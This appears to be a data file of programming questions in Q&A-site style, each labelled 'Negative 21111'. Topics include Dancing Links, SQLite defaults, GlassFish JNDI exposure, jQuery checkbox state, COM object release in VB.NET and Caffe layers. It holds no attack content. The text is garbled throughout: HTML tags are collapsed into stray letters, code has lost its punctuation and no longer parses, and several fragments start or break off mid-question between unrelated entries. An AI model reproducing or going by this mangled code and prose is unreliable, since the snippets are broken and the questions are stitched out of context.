Negative 21111 pDid anyone realize that when Scheduler is configured to load specific data with the getAdditionalData so passing startdate and enddate to NOT load all server data to show, the function is automatically invoked only for current, future data, but not for old data In my case, I have a week view of appointments, and the server function is called only until the previous week then, scrolling furter backward, the function is not invoked anymore...  Or am I missing anything Thanks in advance.p

Negative 21111 pIm trying to implement a Dancing Links structure from a byte matrix in Java. So far so good, however the main issue is my own personal lack of understanding of the topic in order for me to completely implement it, so I was wondering if someone with more knowledge could help As Ive also found the resources quite limited over the internet for me to try and teach myself from.p  pFirstly, are Nodes within a Column linked to each other UP  DOWN links or are they simply all each just linked to strongonlystrong their Column Heads If nodes in a column are directly connected to their column heads via their UP connector, am I right in assuming that the node.UP connects to columnhead.DOWN and node.DOWN connects to columnhead.UPp  pSecondly, in a row, nodes are linked to each other horizontally. Once I reach the end of a row or the final node of a row, does the endNode.RIGHT link to the firstNode.LEFTp  pHere is an already finished implementation in Java which Im using to help me a hrefhttpsgithub.combenfowlerdancinglinksblobmasterdlxsrcmainjavaauidbjfdlxDLX.java relnofollowhttpsgithub.combenfowlerdancinglinksblobmasterdlxsrcmainjavaauidbjfdlxDLX.javaap  pHowever of course, I want to make sure I fully understand what Im working with first and Im only using the linked implementation to help me understand Dancing Links in the first place.p  pAll help is appreciated and if you need any clarification on any of my questions, let me know.p  pThanksp

Negative 21111 pIm wondering what is the best method to store generic classes in a database. For an easy illustration assume the following classesp  precodeInterface IShape   Center Point   Size Point   Color Int  Class Line  IShape   IShape Members...

Fill Bool   FillColor Int  Class Drawing   Name String   Elements ListltIShapegt codepre  pI see the following optionsp  ol lipStoring all objects in one table which has the columns of all possible IShape objects. Then after getting the lines from the database, check for the type and create an object of the specific class. This will cause an messy table, no clear seperation between types.pli lipStoring the IShape members in one table and the other fields in corresponding tables. Get the IShape elements and check which fields need to be loaded additionally for each object.  This will cause a lot of database traffic.pli lipLike No.2 but instead of loading each element and look which fields need to be loaded, do one query per type which returns the joined elements with the correct fields. This will also cause more database trafficor at least queries than No.1 and also may need resorting.pli ol  pHow would you recommend storing them in the database Is there some best practice Interestingly I couldnt find any recommendation.p

Negative 21111 pWhen creating a table in SQLite, I want to define the default value of a column using value from another table as this column is a foreign key. Something like thisp  precodeCREATE TABLE Test1A1 INTEGER PRIMARY KEY, B1 TEXT NOT NULL CREATE TABLE Test2A2 INTEGER PRIMARY KEY, B2 INTEGER NOT NULL DEFAULT [a value in column A1 of Test1] codepre  pI assume that codeTest1code is already populated with the records that provides possible values for codeB2code in codeTest2code table. For example, these may be some constants like Created, In Progress, Paused, Finished for a Status column i.e. codeB2code.p  pI can of course pick the primary key of a value from codeTest1code and hard code it as the default value for codeB2code, but that is error prone if I change the data of codeTest1code later. At the same time, we cannot use codeSELECTcode statement inside a codeCREATEcode.p  pIf this is not feasible in SQLite, is it possible for other SQL engines Or more generally, is this something that should be enforced by application logic rather than by database designp

Negative 21111 pI want to develop the clientserver application with authorization and authentication as security is very important for this application.

Because of this I decided to use shiro instead of JAAS as JAAS doesnt support dynamic passlogins.p  pClient  java standalone client. For server I choose GlassFish4 JavaEE. Ok, I connected using SSL to glassfish. But, what confuses me is that on client side I get all jndi registry via initialcontext. Its bad as client gets access to all server jndi when client must have access only to 23 EJBs. Having googled I found two ways to protect p  ol lito use mutual ssl certificates authorizations  its bad as is not dynamic and these certificates expire.li lito connect to server using JAAS passwordlogin Ive not tested it on GF4.li ol  pHowever both variants give all jndi to client what is not acceptable.

Negative 21111 pSo im an intermediate web designer. I want to make a website that lets students at my university collaborate by advertising work and being able to apply. Its a digital arts university and collaborating is important for everyone.p  pI want to make the site exclusive to students at my uni, therefore will need a sign up log in feature, and I have no idea what I need or how to go about it. Im guessing databases are required I have database knowledge, so shouldnt be a problem.p  pI also want to make the sign up feature exclusive to students with an email domain specific to my uni. I know this is possible, but guessing this would require verification emails to be sent automatically, which makes things harder.p  pSo what im asking, is for some guidance on the matter, if anyone has experience or knows of some good resources I could use, that would be great. ps. Im not interested in having profiles and pages for each member, just want it as a security feature more than anything.p  pthanks alotp

However, when unchecking the check box, the unclear button sticks and the URL is not properly appended. p  pHeres my jQueryp  precode document.readyfunction            var showClearedWarningsFlag  getURLParametershowHideClearedWarnings    ifshowClearedWarningsFlag  SHOW         showClearedWarningsCheckBox.propchecked, true      unclearButton.show      else         showClearedWarningsCheckBox.propchecked, false      unclearButton.hide         showClearedWarningsCheckBox.changefunction        ifthis.ischecked              window.location.search  showHideClearedWarnings  SHOW              else             window.location.search  showHideClearedWarnings  HIDE          clearButton.clickfunction          bagWarningAction.valCLEAR           unclearButton.clickfunction        bagWarningAction.valUNCLEAR      codepre  pSo, what I am trying to do herep  precodeif URL is show    then show unclear button and check box else if URL is hide    dont show unclear button and dont check box on change of checkbox    if checked       append URL to show    else if not checked       append URL to hide codepre  pThen, I have the two buttons for clear and unclear passing through SHOW or HIDE to a hidden input on my page. p  pHowever, what is happening is when I press the check box for show cleared warnings, this is successfully appending the URL, but leaves the checkbox unchecked on the page refresh. So, upon checking the checkbox again, its just redirecting to the SHOW URL. If I manually change the URL to HIDE, it hides the cleared warnings. p  pI think I am missing something very subtle here. If anyone could shed light as to why the checkbox isnt surviving the refresh, I would be very grateful  p

But, this did not happen.  p  pSo I did a lot of searching and reading, and it sounds to me like most likely the other lower level objects coderangecodes, codeworksheetcodes, etc might be keeping the process alive if their RCW count is 0.br emI could be misinterpreting something here, but  thats what Im gatheringemp  pSo now Im trying to make sure I explicitly set the RCW to 0 for emallem my COM objects when Im done with them. p  pstrongIm wondering exactly emwhenem do I need to call codeMarshal.FinalReleaseComObjectcode vs when should I use codeMarshal.ReleaseComObjectcode, etc. strongp  pstrongIn the loop example below, am I using codeFinalReleaseComObjectcode correctlystrong This code is untested as of yet and Im not at a point yet where I can test it.

Im not sure how the return works  does it make a copy of codeVisibleRangecode in memory, so now we have 2 references and then that copy becomes the object in the caller, or does codeVisibleRangecode become the object in the caller so it is only ever one reference  Or is it something elsep  pAlso, do I need to be checking if an object is instantiated i.e. codeNot Is Nothingcode before calling any release com function on itbr I imagine so, but Im not sure if the RCW is created at compile time or after the object is initialized.p  pThanksp  hr  pre classlangvb prettyprintoverridecodePrivate Function FilterAndReturn As Range     Dim FilteredData As Range     Dim TopRange As Range     Dim BottomRange As Range      Try         Get the atuofiltered range to work with         If Table Is Nothing Then             FilteredData  GetFilteredRange             TopRange  FilteredData.Cells1, 1             TopRange  TopRange.EntireRow             BottomRange  FilteredData.Cells.FindWhat,                                                 AfterFilteredData.Cells1, 1,                                                 SearchDirectionXlSearchDirection.xlPrevious,                                                 SearchOrderXlSearchOrder.xlByRows,                                                 LookAtXlLookAt.xlPart,                                                 LookInXlFindLookIn.xlFormulas,                                                 MatchByteFalse,                                                 MatchCaseFalse.EntireRow         Else             FilteredData  Table.DataBodyRange             TopRange  Table.HeaderRowRange             BottomRange  Table.TotalsRowRange         End If          Dim OuterLoop As Integer  0         Dim LoopLast As Integer  Filters.FilterList.Count  1         If Filters.FilterList.Count lt 0 Then Throw New KeyNotFoundException          Class MyFilter objects contain a list of filters which need to be applied to the range         For Each Filter As DictionaryOf String, String In Filters.FilterList             Try                 If OuterLoop  0 Then ClearFilters                  The Add method of MyFilter class ensures that each fitler exists as its own dictionary with a single KVP                 If Filter.Count lt 1 Then Throw New KeyNotFoundException                 If Filter.Count gt 1 Then Throw New ConstraintException                   Not sure of a better way to work with the KVP without knowing the key, so Im using a foreach loop even though I know there is only one KVP                  For Each Definition As KeyValuePairOf String, String In Filter                     Dim VisibleRange As Range                      Try                         Dim FieldIndex As Integer  ReturnFieldIndexDefinition.Key                         If FieldIndex gt 0 Then                             If UBoundDefinition.Value gt 0 Then                                 FilteredData.AutoFilterFieldFieldIndex, Criteria1Definition.Value0, Criteria2Definition.Value0                             Else                                 FilteredData.AutoFilterFieldFieldIndex, Criteria1Definition.Value0                             End If                              VisibleRange  FilteredData.SpecialCellsXlCellType.xlCellTypeVisible                              If Not IncludeHeaders Then TopRange  TopRange.Offset1, 0                             If Not IncludeTotals Then BottomRange  BottomRange.Offset1, 0                              If BottomRange.Row lt TopRange.Row Then Return Nothing                              Dim IntersectRange As Range  FilteredData.Application.RangeTopRange, BottomRange.EntireRow                              If OuterLoop  LoopLast Then Return FilteredData.Application.IntersectIntersectRange, VisibleRange                          End If                     Catch ex As Exception                         MessageBox.Showex.ToString                     Finally                         If Not VisibleRange Is Nothing Then Marshal.FinalReleaseComObjectVisibleRange                     End Try                  Next kvp              Catch ex As Exception                 MessageBox.Showex.ToString             Finally                 Nothing to do here             End Try             OuterLoop  OuterLoop  1          Next dict      Catch ex As KeyNotFoundException         MessageBox.ShowNo filter record defined. amp vbNewLine amp ex.ToString     Catch ex As Exception         MessageBox.Showex.ToString     Finally         If Not FilteredData Is Nothing Then Marshal.FinalReleaseComObjectFilteredData         If Not TopRange Is Nothing Then Marshal.FinalReleaseComObjectTopRange         If Not BottomRange Is Nothing Then Marshal.FinalReleaseComObjectBottomRange     End Try     Return Nothing End Function codepre

Negative 21111 pIm about to start a project which will require a web site, connected to a web service. The web service will retrieve data from a database, and return it to the website.p  pMy question is about how to properly separate business concerns with data access. p  pThe service can be separated by utilizing the repository pattern. Then in the service calls implementations I can get the required data from the repository in the form of entities, then return it over the wire.p  pSimilarly I can do the same on the website. Use the repository to hide the implementation details of getting the data from the service and serializing it into an entity or entities.p  pHowever, my main issue with this approach is that both the service and the website will both have definitions for their entities. Is there a pattern I can use that will allow me to define these entities once, or is this architecture way off from what is common  best practice.p  pI should mention that the technologies Im using are asp.net with c and Im not using an entity framework.p

Negative 21111 pI faced with very strange problem. I had a set of tests which I run daily on Jenkins and without any noticeable changes some assertsexpects started fail.

I have 3 it blocks with similar expectsp  precodevalue1  .someclass value2  .. value3  .. expectvalue1.getText.toContaintratata expectvalue2.getText.toContainuhuhuhu expectvalue3.getText.toContainahahaha codepre  pthey are all situated in different it blocks.

Also while test is getting executed I see that values are getting changed  i even did screenshots and check visual log on browserstack. In the 3rd it block I did other action and assert fails again, BUT it compare it with value which I was expected from step 2, not step 1 SO looks like for some reason I am one step behind... If I comment it block or just asserts in the 1st test, 2nd one passes fine, but 3 fails. If I comment 2 it block, 3rd passes fine. p  pSounds like that in this particular case for some reason some magic happens and only on Jenkins and only on Browserstack.

Negative 21111 pOne of my friend had his birthday today. I thought sending Happy Birthday would be a clich so i had this idea of encoding the message to binary.p  pHappy Birthday first changed to ASCII and became 7297112112121326610511411610410097121 and 7297112112121326610511411610410097121 changed to binary and became 0100100001100001011100000111000001111001001000000100001001101001011100100111010001101000011001000110000101111001.p  pNow the Original Happy Birthday had 14 characters including space and sending it would require 148bit112bit as ASCII is a 8bit code. Now since I changed Happy Birthday to 0100100001100001011100000111000001111001001000000100001001101001011100100111010001101000011001000110000101111001 which is of length 112 and would require 1128bit896 bits to send.p  pIf anyone knows about this stuff let me know if i am thinking correct or are there many loopholes in the above concept. If i am correct then i think we should leave the computers work on computer.p

Negative 21111 pId like to use Caffe to extract image features. However, it takes too long to process an image, so Im looking for ways to optimize for speed.p  pOne thing I noticed is that the network definition Im using has four extra layers on top the one from which Im reading a result and there are no feedback signals, so they should be safe to delete.p  pI tried to delete them from the definition file but it had no effect at all.

I have created a sort of recycle bin feature, that allows users to delete data on the database, but really it just hides it.  In order to use this feature, an entity must implement an interface, which has a particular property against it.  p  pMost of my entities do not inherit from anything, but just implement the interface.  But i have a couple of entities that do inherit from another object.  Sometimes the object they are inheriting from implement the interface and sometimes the object itself will implement the interface.p  pWhen i set the value, i use the entities and entity framework works out which table to update.  But when i unset the property, i am using my own SQL statements.  In order to create my own SQL statements, i need to find out which table has the column i need to update.p  pI cannot use entity framework to load the entities based on the type only, because code.Wherecode doesnt exist on a generic DbSet class.p  pSo i want to create an SQL statement similar to thisp  precodeUPDATE tableX SET interfaceProperty  NULL WHERE interfaceProperty  X codepre

The DLL is my hardcoded algorithm which watches the market provided to it by the Order Manager and places trades.

Upon initialization, the Order Manager will spin up the DLLs.p  pI want to test the Order Manager.   Ideally, my unit tests would masquerade as separate DLLs before the Order Manager is started.
